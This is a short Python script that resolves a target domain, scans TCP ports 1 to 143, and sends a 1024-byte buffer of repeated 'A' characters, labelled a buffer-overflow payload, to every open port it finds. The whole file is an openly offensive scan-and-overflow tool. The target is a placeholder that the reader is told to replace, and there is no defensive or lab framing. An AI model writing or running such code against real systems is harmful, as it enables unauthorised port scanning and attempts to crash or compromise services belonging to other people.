import socket

# Target domain or URL
target_domain = "www.example.com"  # Replace with the target domain or URL

# Port range to scan
start_port = 1
end_port = 143

# Payload for buffer overflow
buffer = b"A" * 1024  # Modify this based on vulnerability analysis

print(f"Resolving domain {target_domain} to IP address...")

try:
    # Resolve the domain to an IP address
    target_ip = socket.gethostbyname(target_domain)
    print(f"[+] Resolved domain {target_domain} to IP: {target_ip}")
except socket.gaierror:
    print(f"[-] Failed to resolve domain {target_domain}. Exiting...")
    exit()

print(f"\nScanning for open ports on {target_ip}...")

# Find open ports
open_ports = []
for port in range(start_port, end_port + 1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((target_ip, port))
        if result == 0:
            print(f"[+] Open port found: {port}")
            open_ports.append(port)
        s.close()
    except Exception as e:
        pass

if not open_ports:
    print("[-] No open ports found. Exiting...")
    exit()

# Send buffer overflow payload to open ports
print("\nAttempting buffer overflow on open ports...")
for port in open_ports:
    try:
        print(f"[+] Sending payload to port {port}...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.send(buffer)
        print(f"[+] Payload sent to port {port} successfully!")
        s.close()
    except Exception as e:
        print(f"[-] Failed to send payload to port {port}: {e}")
